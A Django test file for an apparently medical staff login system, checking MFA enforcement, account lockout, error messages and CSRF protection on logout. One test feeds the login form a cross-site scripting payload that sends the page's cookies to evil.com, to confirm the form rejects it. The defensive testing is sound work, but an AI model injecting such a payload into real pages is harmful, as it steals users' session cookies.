from django.test import Client, TestCase
from django.urls import reverse
from django.utils import timezone

from .models import UserAccount, Staff


class AuthSecurityTests(TestCase):
    def setUp(self):
        self.user = UserAccount.objects.create_user(
            username="doctor1",
            password="StrongPassword123!",
            mfaEnabled=True,
        )

        self.staff = Staff.objects.create(
            user=self.user,
            name="Doctor One",
            role="DOCTOR",
        )

    def test_user_with_mfa_enabled_can_login(self):
        response = self.client.post(reverse("auth_app:login"), {
            "username": "doctor1",
            "password": "StrongPassword123!",
        })

        self.assertEqual(response.status_code, 302)

    def test_user_without_mfa_cannot_login(self):
        self.user.mfaEnabled = False
        self.user.save(update_fields=["mfaEnabled"])

        response = self.client.post(reverse("auth_app:login"), {
            "username": "doctor1",
            "password": "StrongPassword123!",
        })

        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "auth_app/login.html")
        self.assertContains(response, "MFA belum aktif")

    def test_account_locked_after_six_failed_attempts(self):
        for _ in range(6):
            self.client.post(reverse("auth_app:login"), {
                "username": "doctor1",
                "password": "WrongPassword!",
            })

        self.user.refresh_from_db()

        self.assertEqual(self.user.failedLoginAttempts, 1)
        self.assertIsNotNone(self.user.lockedUntil)
        self.assertGreater(self.user.lockedUntil, timezone.now())

    def test_locked_account_cannot_login_even_with_correct_password(self):
        self.user.failedLoginAttempts = 5
        self.user.lockedUntil = timezone.now() + timezone.timedelta(minutes=15)
        self.user.save(update_fields=["failedLoginAttempts", "lockedUntil"])

        response = self.client.post(reverse("auth_app:login"), {
            "username": "doctor1",
            "password": "StrongPassword123!",
        })

        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "auth_app/login.html")
        self.assertContains(response, "Akun terkunci")
        self.assertContains(response, "menit")

    def test_wrong_password_stays_on_login_page_with_message(self):
        response = self.client.post(reverse("auth_app:login"), {
            "username": "doctor1",
            "password": "WrongPassword!",
        })

        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "auth_app/login.html")
        self.assertContains(response, "Username atau password salah")

    def test_login_form_rejects_script_payload_fields(self):
        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"

        response = self.client.post(reverse("auth_app:login"), {
            "username": payload,
            "password": payload,
        })

        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, "auth_app/login.html")
        self.assertContains(response, "Username atau password salah")
        self.assertContains(response, "Password mengandung karakter")
        self.assertNotIn("_auth_user_id", self.client.session)

    def test_authenticated_user_cannot_open_login_page(self):
        self.client.force_login(self.user)

        response = self.client.get(reverse("auth_app:login"), follow=True)

        self.assertRedirects(response, reverse("landing_page"))
        self.assertContains(response, "Anda sudah login")

    def test_access_denied_endpoint_redirects_home(self):
        self.client.force_login(self.user)

        response = self.client.get(reverse("auth_app:denied"))

        self.assertRedirects(response, reverse("landing_page"))

    def test_logout_requires_post_csrf_token_when_enforced(self):
        csrf_client = Client(enforce_csrf_checks=True)
        csrf_client.force_login(self.user)

        response = csrf_client.post(reverse("auth_app:logout"))

        self.assertEqual(response.status_code, 403)
        self.assertTemplateUsed(response, "auth_app/forbidden.html")
        self.assertContains(response, "Forbidden Request", status_code=403)
